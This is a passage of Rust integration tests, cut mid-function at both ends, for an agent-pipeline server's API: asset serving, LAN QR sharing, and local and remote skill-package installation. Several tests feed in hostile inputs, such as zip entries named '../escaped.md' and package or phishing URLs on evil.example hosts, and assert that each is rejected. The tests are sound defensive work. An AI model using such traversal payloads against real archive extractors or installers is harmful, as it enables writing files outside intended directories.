    use agentpipeline_core::pipeline::Executor;
    use futures::future::BoxFuture;
    use testkit::RecordingKiller;

    struct Unavailable;
    impl LlmClient for Unavailable {
        fn complete(
            &self,
            _request: LlmRequest,
        ) -> BoxFuture<'static, agentpipeline_core::Result<AgentResponse>> {
            Box::pin(async { Err(agentpipeline_core::Error::Llm("provider 不可用".into())) })
        }
    }

    let api = api().await;
    let project_id = seed(&api, "t-degraded").await;

    let executor = Arc::new(Executor::new(
        api.state.store.clone(),
        api.state.settings.clone(),
        api.state.sse.clone(),
        Arc::new(Unavailable),
        Arc::new(RecordingKiller::new()),
    ));
    let mut state = api.state.clone();
    state.executor = Some(executor);
    let router = build_router(state);

    let (status, _) = json_body(
        router
            .clone()
            .oneshot(
                request("POST", "/projects/analyze")
                    .header(header::CONTENT_TYPE, "application/json")
                    .body(Body::from(
                        serde_json::json!({ "project_id": project_id }).to_string(),
                    ))
                    .unwrap(),
            )
            .await
            .unwrap(),
    )
    .await;
    assert_eq!(status, StatusCode::ACCEPTED);

    let mut analysis = Value::Null;
    for _ in 0..200 {
        let (_, body) = json_body(
            router
                .clone()
                .oneshot(
                    request("GET", &format!("/projects/{project_id}/analysis"))
                        .body(Body::empty())
                        .unwrap(),
                )
                .await
                .unwrap(),
        )
        .await;
        if body["status"] == "done" || body["status"] == "failed" {
            analysis = body;
            break;
        }
        tokio::time::sleep(std::time::Duration::from_millis(20)).await;
    }

    assert_eq!(analysis["status"], "done", "降级不使分析失败：{analysis}");
    assert!(
        analysis["result"]["summary_error"].is_string(),
        "应记下摘要错误原因：{analysis}"
    );
    assert!(
        analysis["result"]["language"].is_string(),
        "确定性探测事实必须保留：{analysis}"
    );

    // run 行仍落库并收尾为 failed（决策 100：失败等同父节点失败）
    let runs = api
        .state
        .store
        .list_project_runs(&project_id)
        .await
        .unwrap();
    assert_eq!(runs.len(), 1);
    assert_eq!(
        runs[0].status,
        agentpipeline_core::types::NodeStatus::Failed
    );
    assert!(runs[0].error.is_some(), "失败原因应写入 run 行");
}

// ── 前端静态资源同源托管（决策 155）──────────────────────────────

/// oneshot 后取原始字节（静态资源不是 JSON，不复用 `json_body`）。
async fn raw(response: axum::response::Response) -> (StatusCode, Vec<u8>) {
    let status = response.status();
    let bytes = axum::body::to_bytes(response.into_body(), 8 * 1024 * 1024)
        .await
        .unwrap();
    (status, bytes.to_vec())
}

async fn get_raw(api: &Api, uri: &str) -> (StatusCode, Vec<u8>) {
    let response = api
        .router
        .clone()
        .oneshot(request("GET", uri).body(Body::empty()).unwrap())
        .await
        .unwrap();
    raw(response).await
}

#[tokio::test]
async fn root_serves_embedded_frontend_or_build_hint() {
    let api = api().await;
    let (status, bytes) = get_raw(&api, "/").await;
    let body = String::from_utf8_lossy(&bytes).into_owned();
    assert_eq!(status, 200, "{body}");
    assert!(body.contains("AgentPipeline"), "{body}");
    if app::assets::EMBEDDED_ASSETS.is_empty() {
        assert!(
            body.contains("make build"),
            "未内嵌时应返回构建提示页：{body}"
        );
    } else {
        assert!(
            body.contains("/assets/"),
            "内嵌时应返回构建产物 index.html：{body}"
        );
    }
}

#[tokio::test]
async fn embedded_assets_are_served_verbatim_with_mime() {
    let api = api().await;
    let Some((name, expected)) = app::assets::EMBEDDED_ASSETS.first() else {
        // 未内嵌（无 dist 的构建环境）：未知资产契约恒为 404
        let (status, _) = get_raw(&api, "/assets/index-000000.js").await;
        assert_eq!(status, 404);
        return;
    };

    let response = api
        .router
        .clone()
        .oneshot(
            request("GET", &format!("/{name}"))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    let content_type = response
        .headers()
        .get(header::CONTENT_TYPE)
        .expect("应有 Content-Type")
        .to_str()
        .unwrap()
        .to_owned();
    let (status, bytes) = raw(response).await;

    assert_eq!(status, 200);
    assert_eq!(&bytes, *expected, "资产应原样回放");
    let ext = name.rsplit('.').next().unwrap_or("");
    let expect_mime = match ext {
        "html" => "text/html; charset=utf-8",
        "js" => "text/javascript; charset=utf-8",
        "css" => "text/css; charset=utf-8",
        _ => return,
    };
    assert_eq!(content_type, expect_mime);
}

#[tokio::test]
async fn unknown_asset_returns_404() {
    let api = api().await;
    let (status, _) = get_raw(&api, "/assets/deadbeef-not-here.js").await;
    assert_eq!(status, 404);
}

/* ─────────── 局域网分享端点（决策 167）：/server-info 与 /server-info/qr.svg ─────────── */

#[tokio::test]
async fn server_info_reports_bind_host_port_and_loopback_flag() {
    let api = api().await;
    let (status, body) = get(&api, "/server-info").await;
    assert_eq!(status, 200);
    // 契约测试的 AppState 由 AppState::new 构造，缺省 bind_host = 127.0.0.1
    assert_eq!(body["host"], "127.0.0.1");
    assert_eq!(body["port"], PORT);
    assert_eq!(
        body["loopback_only"], true,
        "缺省绑定是回环，分享页据此提示如何开启局域网访问"
    );
    assert!(
        body["addresses"].is_array(),
        "addresses 恒为数组（枚举不到时为空表，不是 null）：{body}"
    );
}

#[tokio::test]
async fn server_info_reports_lan_bind_as_not_loopback_only() {
    // 绑 0.0.0.0 时 loopback_only 必须为 false，否则分享页会一直显示「请绑 0.0.0.0」的死循环指引
    let home = TestHome::new().unwrap();
    let (store, _clock) = home.setup().await.unwrap();
    let state = AppState::new(store, home.home().clone(), Settings::default(), PORT)
        .with_bind_host("0.0.0.0");
    let router = build_router(state);

    let response = router
        .oneshot(request("GET", "/server-info").body(Body::empty()).unwrap())
        .await
        .unwrap();
    let (status, body) = json_body(response).await;
    assert_eq!(status, 200);
    assert_eq!(body["host"], "0.0.0.0");
    assert_eq!(body["loopback_only"], false);
}

#[tokio::test]
async fn qr_svg_renders_for_a_loopback_url() {
    let api = api().await;
    let url = format!("http://127.0.0.1:{PORT}");
    let response = api
        .router
        .clone()
        .oneshot(
            request("GET", &format!("/server-info/qr.svg?url={url}"))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(response.status(), 200);
    let content_type = response
        .headers()
        .get(header::CONTENT_TYPE)
        .expect("应有 Content-Type")
        .to_str()
        .unwrap()
        .to_owned();
    assert_eq!(content_type, "image/svg+xml; charset=utf-8");
    assert_eq!(
        response
            .headers()
            .get(header::CACHE_CONTROL)
            .map(|v| v.to_str().unwrap()),
        Some("no-store"),
        "二维码随端口变化，不得缓存"
    );
    let (_, bytes) = raw(response).await;
    let svg = String::from_utf8(bytes).unwrap();
    assert!(svg.starts_with("<?xml"), "应是 SVG：{svg:.60}");
    assert!(svg.contains("<path"), "应含二维码模块");
}

#[tokio::test]
async fn qr_svg_rejects_arbitrary_urls() {
    // 只允许编码本服务自己的地址：否则这个端点成了「用你的服务生成任意二维码」的图床
    let api = api().await;
    let (status, body) = get(
        &api,
        "/server-info/qr.svg?url=http%3A%2F%2Fevil.example%2Fphish",
    )
    .await;
    assert_eq!(status, 400, "外部 URL 必须被拒绝：{body}");
}

#[tokio::test]
async fn server_info_endpoints_are_reachable_without_client_header() {
    // 两个端点都是纯 GET：不携带 X-AgentPipeline 也必须可达（手机首次加载页面时还没有它）
    let api = api().await;
    let (status, _) = get(&api, "/server-info").await;
    assert_eq!(status, 200);
    let (status, _) = get(
        &api,
        &format!("/server-info/qr.svg?url=http%3A%2F%2F127.0.0.1%3A{PORT}"),
    )
    .await;
    assert_eq!(status, 200);
}

// ═══════════════════ 技能市场：本地导入 / 扫描 / 卸载（决策 172⑤，票 09）═══════════════════
//
// 五条契约用例对应票面列出的验收清单：上传合法 zip 成功 / 缺 `SKILL.md` 拒绝 /
// 同名未确认拒绝 / 扫描返回清单 / 卸载后引用报错。全部**离线**（无网络调用）。

/// 用原始 zip 字节 POST（请求体就是 zip，不是 multipart，见 routes/skills.rs 模块头注释）。
async fn post_zip(api: &Api, uri: &str, zip: Vec<u8>) -> (StatusCode, Value) {
    call(
        api,
        request("POST", uri)
            .header(header::CONTENT_TYPE, "application/zip")
            .body(Body::from(zip))
            .unwrap(),
    )
    .await
}

fn skills_root(api: &Api) -> std::path::PathBuf {
    api.state.home.skills_dir()
}

/// ① 上传合法 zip → 成功落盘（布局为 `{name}/SKILL.md` + 兄弟文件）。
#[tokio::test]
async fn import_zip_installs_skill_with_siblings() {
    let api = api().await;
    let zip = skill_zip("grill", "拷问协议正文", &[("tests.md", "兄弟文件")]);

    let (status, body) = post_zip(&api, "/skills/import", zip).await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["skill"]["name"], "grill");
    assert_eq!(body["skill"]["sibling_count"], 1);

    let root = skills_root(&api);
    assert!(root.join("grill/SKILL.md").is_file());
    assert!(
        root.join("grill/tests.md").is_file(),
        "兄弟文件须一并落盘，否则票 07 的展开会缺文件"
    );
    // 装完即可见（`GET /skills` 与启动校验同源）
    let (status, body) = get(&api, "/skills").await;
    assert_eq!(status, StatusCode::OK);
    let names: Vec<&str> = body["skills"]
        .as_array()
        .unwrap()
        .iter()
        .map(|s| s["name"].as_str().unwrap())
        .collect();
    assert!(names.contains(&"grill"), "{body}");
}

/// ② 缺 `SKILL.md` → 400 拒绝，报文说清缺什么，且**不落盘**。
#[tokio::test]
async fn import_zip_without_skill_md_is_rejected() {
    let api = api().await;
    let zip = zip_bytes(&[("grill/notes.md", "只有笔记")]);

    let (status, body) = post_zip(&api, "/skills/import", zip).await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    assert!(
        body["error"].as_str().unwrap().contains("SKILL.md"),
        "{body}"
    );
    assert!(
        !skills_root(&api).join("grill").exists(),
        "拒绝的包不得留下半份痕迹"
    );
}

/// 路径穿越的包被拒绝，且技能根之外不留任何文件（票 09 的主要风险）。
#[tokio::test]
async fn import_zip_rejects_path_traversal() {
    let api = api().await;
    let zip = zip_bytes(&[("s/SKILL.md", "正文"), ("../escaped.md", "逃逸")]);

    let (status, body) = post_zip(&api, "/skills/import", zip).await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    assert!(body["error"].as_str().unwrap().contains("穿越"), "{body}");
    assert!(!skills_root(&api).join("escaped.md").exists());
    assert!(!api.state.home.root().join("escaped.md").exists());
}

/// ③ 同名冲突默认拒绝，报出技能名与当前来源；显式 `overwrite=true` 才覆盖。
#[tokio::test]
async fn import_zip_same_name_requires_explicit_overwrite() {
    let api = api().await;
    let root = skills_root(&api);

    let (status, _) = post_zip(&api, "/skills/import", skill_zip("dupe", "第一版正文", &[])).await;
    assert_eq!(status, StatusCode::OK);

    // 未确认 → 409，报文含技能名与当前来源
    let (status, body) =
        post_zip(&api, "/skills/import", skill_zip("dupe", "第二版正文", &[])).await;
    assert_eq!(status, StatusCode::CONFLICT, "{body}");
    let err = body["error"].as_str().unwrap();
    assert!(err.contains("dupe"), "报文须含技能名：{body}");
    assert!(err.contains("SKILL.md"), "报文须含当前来源：{body}");

    // 原内容未被改动
    assert!(std::fs::read_to_string(root.join("dupe/SKILL.md"))
        .unwrap()
        .contains("第一版正文"));

    // 显式确认 → 覆盖成功
    let (status, body) = post_zip(
        &api,
        "/skills/import?overwrite=true",
        skill_zip("dupe", "第二版正文", &[]),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert!(std::fs::read_to_string(root.join("dupe/SKILL.md"))
        .unwrap()
        .contains("第二版正文"));
}

/// ④ 目录扫描返回清单：名字 + 描述 + 是否已存在。
#[tokio::test]
async fn scan_lists_importable_skills_with_existence() {
    let api = api().await;
    let source = api._home.scratch_dir("zcode-skills");

    write_skill_dir(&source, "scan-me", "待导入的正文", &[("tests.md", "兄弟")]);
    // 已在目标技能根里（exists 须为 true）
    let root = skills_root(&api);
    std::fs::create_dir_all(root.join("already")).unwrap();
    std::fs::write(root.join("already/SKILL.md"), "已存在").unwrap();
    write_skill_dir(&source, "already", "同名的另一份", &[]);
    // 杂物：没有 SKILL.md 的目录不进清单
    std::fs::create_dir_all(source.join("junk")).unwrap();

    let (status, body) = get(&api, &format!("/skills/scan?root={}", source.display())).await;
    assert_eq!(status, StatusCode::OK, "{body}");
    let skills = body["skills"].as_array().unwrap();
    let names: Vec<&str> = skills.iter().map(|s| s["name"].as_str().unwrap()).collect();
    assert!(names.contains(&"scan-me"), "{body}");
    assert!(!names.contains(&"junk"), "杂物不得进清单：{body}");

    let already = skills.iter().find(|s| s["name"] == "already").unwrap();
    assert_eq!(already["exists"], true, "已在技能根里须标记：{body}");
    let scan_me = skills.iter().find(|s| s["name"] == "scan-me").unwrap();
    assert_eq!(scan_me["exists"], false);
}

/// 扫描返回 `description`（界面的「可用技能目录」靠它展示）。
#[tokio::test]
async fn scan_carries_frontmatter_description() {
    let api = api().await;
    let source = api._home.scratch_dir("described");
    let dir = source.join("desc");
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::write(
        dir.join("SKILL.md"),
        "---\nname: desc\ndescription: 拷问设计树\n---\n\n正文",
    )
    .unwrap();

    let (status, body) = get(&api, &format!("/skills/scan?root={}", source.display())).await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["skills"][0]["description"], "拷问设计树");
}

/// 扫描一个不存在的目录 → 400（不是 500，也不是空清单）。
#[tokio::test]
async fn scan_of_missing_root_is_rejected() {
    let api = api().await;
    let (status, body) = get(&api, "/skills/scan?root=/definitely/not/here").await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
}

/// 目录导入支持批量：逐项结果，一项坏不中断整批。
#[tokio::test]
async fn import_dir_reports_per_item_without_aborting_the_batch() {
    let api = api().await;
    let source = api._home.scratch_dir("batch");
    let good = write_skill_dir(&source, "good", "好技能", &[]);
    let also = write_skill_dir(&source, "also-good", "另一个好技能", &[]);
    // 坏项：目录里没有 SKILL.md
    let bad = source.join("bad");
    std::fs::create_dir_all(&bad).unwrap();
    std::fs::write(bad.join("readme.md"), "杂物").unwrap();

    let (status, body) = post(
        &api,
        "/skills/import-dir",
        serde_json::json!({
            "paths": [good, bad, also],
        }),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["succeeded"], 2, "{body}");
    assert_eq!(body["failed"], 1, "{body}");
    let results = body["results"].as_array().unwrap();
    assert_eq!(results.len(), 3, "逐项结果一项不落：{body}");
    assert_eq!(results[1]["ok"], false, "{body}");

    // 好的两项确实落盘了（一个坏项没有中断整批）
    let root = skills_root(&api);
    assert!(root.join("good/SKILL.md").is_file());
    assert!(root.join("also-good/SKILL.md").is_file());
}

/// ⑤ 卸载后引用报错——技能名是唯一身份，不得静默降级（票 09 的核心不变量）。
///
/// 两条路径都断言：卸载本身成功（**不**因被引用而拒绝，否则制造「想卸载得先改配置、
/// 想改配置得先卸载」的先后依赖），以及随后的 `PUT /stage-configs` fail fast。
#[tokio::test]
async fn uninstall_then_referencing_config_fails_fast() {
    let api = api().await;

    // 先装一个技能并把它写进阶段配置
    let (status, _) = post_zip(
        &api,
        "/skills/import",
        skill_zip("referenced", "被引用的技能正文", &[]),
    )
    .await;
    assert_eq!(status, StatusCode::OK);
    let (status, body) = put(
        &api,
        "/stage-configs/architect-design",
        serde_json::json!({"skills_json": ["referenced"]}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "装着的时候写入应当通过：{body}");

    // `GET /skills` 提前告知「这个技能被哪些配置引用」（卸载前看得到后果）
    let (_, body) = get(&api, "/skills").await;
    let entry = body["skills"]
        .as_array()
        .unwrap()
        .iter()
        .find(|s| s["name"] == "referenced")
        .unwrap()
        .clone();
    let declared = entry["declared_in"].as_array().unwrap();
    assert!(
        declared
            .iter()
            .any(|d| d.as_str().unwrap().contains("architect-design")),
        "须报出引用它的阶段：{entry}"
    );

    // 卸载：允许（引用完整性不在这里拦）
    let (status, body) = delete(&api, "/skills/referenced").await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert!(!skills_root(&api).join("referenced").exists());

    // 卸载后写入引用它的配置 → 400 fail fast，且报文含技能名
    let (status, body) = put(
        &api,
        "/stage-configs/develop",
        serde_json::json!({"skills_json": ["referenced"]}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    assert!(
        body["error"].as_str().unwrap().contains("referenced"),
        "{body}"
    );
}

/// 卸载不存在的技能 → 404；工具型技能（PATH 可执行文件）→ 400。
#[tokio::test]
async fn uninstall_unknown_skill_is_404() {
    let api = api().await;
    let (status, body) = delete(&api, "/skills/no-such-skill").await;
    assert_eq!(status, StatusCode::NOT_FOUND, "{body}");
}

/// 本机无网时票 09 的功能全部可用——本端点组不依赖任何网络（票 09 最后一条验收项）。
///
/// 断言的是「导入 / 列表 / 扫描」三段全链路在纯本地路径下跑通，没有需要出网的环节。
#[tokio::test]
async fn skill_market_works_fully_offline() {
    let api = api().await;
    let source = api._home.scratch_dir("offline-src");
    write_skill_dir(&source, "offline", "离线正文", &[]);

    // 扫描 → 目录导入 → 列表，全程本地
    let (status, body) = get(&api, &format!("/skills/scan?root={}", source.display())).await;
    assert_eq!(status, StatusCode::OK, "{body}");
    let (status, body) = post(
        &api,
        "/skills/import-dir",
        serde_json::json!({"paths": [source.join("offline")]}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["succeeded"], 1, "{body}");
    let (status, body) = get(&api, "/skills").await;
    assert_eq!(status, StatusCode::OK);
    assert!(body["skills"]
        .as_array()
        .unwrap()
        .iter()
        .any(|s| s["name"] == "offline"));
}

/// 空请求体 → 400（而不是把空字节当 zip 解析后报一个难懂的 IO 错）。
#[tokio::test]
async fn import_empty_body_is_rejected() {
    let api = api().await;
    let (status, body) = post_zip(&api, "/skills/import", Vec::new()).await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    assert!(body["error"].as_str().unwrap().contains("为空"), "{body}");
}

/// 含路径分隔符的技能名被拒（`?name=a/b`）——否则会出现「装得进、列不出、删不掉」的状态。
#[tokio::test]
async fn import_rejects_skill_name_with_separator() {
    let api = api().await;
    let zip = zip_bytes(&[("SKILL.md", "平铺的正文")]);
    let (status, body) = post_zip(&api, "/skills/import?name=a%2Fb", zip).await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    assert!(
        body["error"].as_str().unwrap().contains("路径分隔符"),
        "{body}"
    );
    assert!(!skills_root(&api).join("a").exists(), "拒绝后不得落盘");
}

/// 平铺打包的 zip（`SKILL.md` 在包根）配上显式技能名即可安装。
#[tokio::test]
async fn import_flat_zip_with_explicit_name() {
    let api = api().await;
    let zip = zip_bytes(&[("SKILL.md", "平铺打包的正文"), ("tests.md", "兄弟")]);
    let (status, body) = post_zip(&api, "/skills/import?name=flat", zip).await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["skill"]["name"], "flat");
    assert!(skills_root(&api).join("flat/SKILL.md").is_file());
    assert!(skills_root(&api).join("flat/tests.md").is_file());
}

/// 平铺 zip 不给名 → 400 并说明「须显式指定技能名」，而不是猜一个名字。
#[tokio::test]
async fn import_flat_zip_without_name_is_rejected() {
    let api = api().await;
    let zip = zip_bytes(&[("SKILL.md", "平铺的正文")]);
    let (status, body) = post_zip(&api, "/skills/import", zip).await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    assert!(
        body["error"].as_str().unwrap().contains("显式指定技能名"),
        "{body}"
    );
}

// ═══════════════════ 技能市场：远程 registry（决策 172⑤，票 10）═══════════════════
//
// 全部**离线**：客户端由 `AppState` 注入 testkit 的 `FakeMarket`。这组用例钉住票面要求的
// 五条路径（正常安装 / 摘要不符 / 来源未放行 / 索引畸形 / 网络失败）外加票 09 不受影响。

const MARKET_SRC: &str = "https://skills.example.com";

fn market_sources() -> Vec<String> {
    vec![MARKET_SRC.to_string()]
}

/// 造一个「索引与内容一致」的 fake，并把它装进一个 api。
async fn api_with_one_skill(name: &str, body: &str) -> (Api, Vec<u8>) {
    let bytes = skill_zip(name, body, &[("tests.md", "兄弟文件")]);
    let e = entry(name, MARKET_SRC, &bytes);
    let fake = FakeMarket::with_entries(vec![e.clone()]).serving(&e.url, &bytes);
    (
        api_with_market(Arc::new(fake), market_sources()).await,
        bytes,
    )
}

/// ① 正常安装：搜索能看到候选，安装后落盘且出现在 `GET /skills`。
#[tokio::test]
async fn market_search_lists_then_install_lands_the_skill() {
    let (api, _bytes) = api_with_one_skill("market-grill", "市场来的正文").await;

    let (status, body) = get(&api, "/market/search").await;
    assert_eq!(status, StatusCode::OK, "{body}");
    let names: Vec<&str> = body["skills"]
        .as_array()
        .unwrap()
        .iter()
        .map(|s| s["name"].as_str().unwrap())
        .collect();
    assert_eq!(names, vec!["market-grill"]);
    // 候选带完整五字段，界面据此展示装前信息
    assert_eq!(body["skills"][0]["version"], "1.0.0");
    assert_eq!(body["skills"][0]["sha256"].as_str().unwrap().len(), 64);
    assert_eq!(body["skills"][0]["source"], MARKET_SRC);

    let (status, body) = post(
        &api,
        "/market/install",
        serde_json::json!({"name": "market-grill"}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["skill"]["name"], "market-grill");
    assert_eq!(body["skill"]["sibling_count"], 1);
    // 落盘走票 09 的同一入口，故布局与本地导入一致
    assert!(skills_root(&api).join("market-grill/SKILL.md").is_file());
    assert!(skills_root(&api).join("market-grill/tests.md").is_file());

    let (status, body) = get(&api, "/skills").await;
    assert_eq!(status, StatusCode::OK);
    assert!(body["skills"]
        .as_array()
        .unwrap()
        .iter()
        .any(|s| s["name"] == "market-grill"));
}

/// 关键词筛选：命中名字或描述，未命中的不出现。
#[tokio::test]
async fn market_search_filters_by_keyword() {
    let bytes_a = skill_zip("grill-me", "A", &[]);
    let bytes_b = skill_zip("to-spec", "B", &[]);
    let a = entry("grill-me", MARKET_SRC, &bytes_a);
    let b = entry("to-spec", MARKET_SRC, &bytes_b);
    let fake = FakeMarket::with_entries(vec![a.clone(), b.clone()])
        .serving(&a.url, &bytes_a)
        .serving(&b.url, &bytes_b);
    let api = api_with_market(Arc::new(fake), market_sources()).await;

    let (status, body) = get(&api, "/market/search?q=grill").await;
    assert_eq!(status, StatusCode::OK, "{body}");
    let names: Vec<&str> = body["skills"]
        .as_array()
        .unwrap()
        .iter()
        .map(|s| s["name"].as_str().unwrap())
        .collect();
    assert_eq!(names, vec!["grill-me"]);
}

/// ② 摘要不符 → 400，报文**同时给出期望值与实际值**，且不落盘。
#[tokio::test]
async fn market_install_rejects_digest_mismatch() {
    let bytes = skill_zip("tampered", "被篡改的正文", &[]);
    // 索引钉一个与内容不符的摘要
    let e = entry_with_wrong_digest(
        "tampered",
        MARKET_SRC,
        &format!("{MARKET_SRC}/skills/tampered-1.0.0.zip"),
    );
    let fake = FakeMarket::with_entries(vec![e.clone()]).serving(&e.url, &bytes);
    let api = api_with_market(Arc::new(fake), market_sources()).await;

    let (status, body) = post(
        &api,
        "/market/install",
        serde_json::json!({"name": "tampered"}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    let msg = body["error"].as_str().unwrap();
    assert!(msg.contains("摘要不符"), "{msg}");
    assert!(msg.contains(&"a".repeat(64)), "须给出期望值：{msg}");
    assert!(
        msg.contains(&agentpipeline_core::agent::market::sha256_hex(&bytes)),
        "须给出实际值：{msg}"
    );
    assert!(!skills_root(&api).join("tampered").exists(), "不得落盘");
}

/// ③ 来源未放行 → 400；未放行的条目**搜索时就不出现**。
#[tokio::test]
async fn market_rejects_unallowed_source() {
    let bytes = skill_zip("rogue", "陌生来源的正文", &[]);
    let mut e = entry("rogue", "https://evil.example", &bytes);
    e.url = "https://evil.example/skills/rogue-1.0.0.zip".into();
    let fake = FakeMarket::with_entries(vec![e.clone()]).serving(&e.url, &bytes);
    let api = api_with_market(Arc::new(fake), market_sources()).await;

    // 搜索侧：装不上的东西不该出现在候选里
    let (status, body) = get(&api, "/market/search").await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert!(
        body["skills"].as_array().unwrap().is_empty(),
        "未放行来源不得进候选：{body}"
    );

    // 安装侧：即使绕过搜索直接点名，也必须拒绝
    let (status, body) = post(
        &api,
        "/market/install",
        serde_json::json!({"name": "rogue"}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    assert!(body["error"].as_str().unwrap().contains("未放行"), "{body}");
    assert!(!skills_root(&api).join("rogue").exists());
}

/// `source` 放行但**下载地址**指向别处的条目：搜索侧不出现，安装侧也被拒。
///
/// 两侧同口径——候选侧存在的意义就是「看不到装不上的东西」。CDN 场景下这类条目是常见的
/// （索引与包不同源），故这条路径必须有测试。
#[tokio::test]
async fn market_rejects_an_entry_whose_download_url_is_unlisted() {
    let bytes = skill_zip("cdn-skill", "正文", &[]);
    let mut e = entry("cdn-skill", MARKET_SRC, &bytes);
    e.url = "https://cdn.evil.example/cdn-skill.zip".into();
    let fake = FakeMarket::with_entries(vec![e.clone()]).serving(&e.url, &bytes);
    let api = api_with_market(Arc::new(fake), market_sources()).await;

    let (status, body) = get(&api, "/market/search").await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert!(
        body["skills"].as_array().unwrap().is_empty(),
        "下载地址未放行的条目不得进候选：{body}"
    );

    let (status, body) = post(
        &api,
        "/market/install",
        serde_json::json!({"name": "cdn-skill"}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    assert!(body["error"].as_str().unwrap().contains("未放行"), "{body}");
    assert!(!skills_root(&api).join("cdn-skill").exists());
}

/// 空白名单（默认）= 不允许任何远程安装，报文说明怎么开——不是 500。
#[tokio::test]
async fn market_with_no_configured_source_is_refused_actionably() {
    let api = api().await;
    let (status, body) = get(&api, "/market/search").await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    let msg = body["error"].as_str().unwrap();
    assert!(msg.contains("allowed_sources"), "须说清怎么开：{msg}");
    assert!(
        msg.contains("本地导入不受影响"),
        "须说明离线能力仍在：{msg}"
    );
}

/// ④ 索引畸形 → 400（**不与网络失败混淆**，状态码也分开）。
#[tokio::test]
async fn market_reports_malformed_index_distinctly() {
    let fake = FakeMarket::malformed_index("<html>404</html>");
    let api = api_with_market(Arc::new(fake), market_sources()).await;

    let (status, body) = get(&api, "/market/search").await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    let msg = body["error"].as_str().unwrap();
    assert!(msg.contains("JSON"), "{msg}");
    assert!(!msg.contains("网络"), "不得与网络失败混淆：{msg}");
}

/// ⑤ 网络失败 → **502**（下游不可达），与四类 400 区分开。
#[tokio::test]
async fn market_reports_network_failure_distinctly() {
    let fake = FakeMarket::index_unreachable();
    let api = api_with_market(Arc::new(fake), market_sources()).await;

    let (status, body) = get(&api, "/market/search").await;
    assert_eq!(status, StatusCode::BAD_GATEWAY, "{body}");
    let msg = body["error"].as_str().unwrap();
    assert!(msg.contains("网络失败"), "{msg}");
    assert!(!msg.contains("摘要不符"), "不得混淆：{msg}");
    assert!(!msg.contains("未放行"), "不得混淆：{msg}");
}

/// 索引里没有该技能 → 404（而不是一个含糊的 400）。
#[tokio::test]
async fn market_unknown_skill_is_not_found() {
    let bytes = skill_zip("known", "正文", &[]);
    let e = entry("known", MARKET_SRC, &bytes);
    let fake = FakeMarket::with_entries(vec![e.clone()]).serving(&e.url, &bytes);
    let api = api_with_market(Arc::new(fake), market_sources()).await;

    let (status, body) = post(
        &api,
        "/market/install",
        serde_json::json!({"name": "unknown"}),
    )
    .await;
    assert_eq!(status, StatusCode::NOT_FOUND, "{body}");
    assert!(
        body["error"].as_str().unwrap().contains("unknown"),
        "{body}"
    );
}

/// 同名已存在 → 409（票 09 的冲突语义），显式 `overwrite` 才覆盖。
#[tokio::test]
async fn market_install_same_name_requires_explicit_overwrite() {
    let (api, _) = api_with_one_skill("dup", "市场来的正文").await;
    // 先本地装一个同名技能
    let local = skill_zip("dup", "本地已有的正文", &[]);
    let (status, body) = post_zip(&api, "/skills/import", local).await;
    assert_eq!(status, StatusCode::OK, "{body}");

    let (status, body) = post(&api, "/market/install", serde_json::json!({"name": "dup"})).await;
    assert_eq!(status, StatusCode::CONFLICT, "{body}");
    let content = std::fs::read_to_string(skills_root(&api).join("dup/SKILL.md")).unwrap();
    assert!(content.contains("本地已有的正文"), "未确认不得覆盖");

    // 显式覆盖后市场版本生效
    let (status, body) = post(
        &api,
        "/market/install",
        serde_json::json!({"name": "dup", "overwrite": true}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    let content = std::fs::read_to_string(skills_root(&api).join("dup/SKILL.md")).unwrap();
    assert!(content.contains("市场来的正文"), "{content}");
}

/// 票 09 的穿越防护在**市场路径**上同样生效：摘要对得上的恶意包也被拒。
///
/// 这是「落盘只实现一次」的价值——远程包不比本地上传的包享有更宽的路。
#[tokio::test]
async fn market_package_still_undergoes_traversal_defense() {
    let evil = zip_bytes(&[
        ("s/SKILL.md", "---\nname: s\n---\n\n正文"),
        ("../escaped.md", "逃逸"),
    ]);
    let e = entry("s", MARKET_SRC, &evil);
    let fake = FakeMarket::with_entries(vec![e.clone()]).serving(&e.url, &evil);
    let api = api_with_market(Arc::new(fake), market_sources()).await;

    let (status, body) = post(&api, "/market/install", serde_json::json!({"name": "s"})).await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    assert!(body["error"].as_str().unwrap().contains("穿越"), "{body}");
    assert!(!api._home.home().root().join("escaped.md").exists());
    assert!(!skills_root(&api).join("escaped.md").exists());
}

/// 票面验收：**本机无网时票 09 不受影响**——市场失败不阻塞任何本地导入路径。
///
/// 用一个「拉索引必失败」的 fake 模拟无网，然后照常走扫描 / 目录导入 / 列表。
#[tokio::test]
async fn offline_market_does_not_block_local_import() {
    let fake = FakeMarket::index_unreachable();
    let api = api_with_market(Arc::new(fake), market_sources()).await;

    // 市场侧确实失败（网络错误，502）
    let (status, _) = get(&api, "/market/search").await;
    assert_eq!(status, StatusCode::BAD_GATEWAY);

